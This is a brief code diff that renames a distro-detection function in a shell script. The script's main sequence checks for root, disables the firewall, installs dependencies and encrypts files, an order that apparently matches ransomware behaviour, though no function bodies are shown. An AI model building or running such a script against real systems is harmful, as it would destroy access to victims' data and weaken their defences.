@@ -12,7 +12,7 @@ check_root() {
     fi
 }
 
-distro() {
+check_distro() {
     distro=$(uname -a)
 
     if [[ $distro == *"Ubuntu"* ]] || [[ $distro == *"Debian"* ]]; then
@@ -103,7 +103,7 @@ encrypt_files() {
 }
 
 check_root
-distro
+check_distro
 disable_firewall
 install_dependencies
 encrypt_files
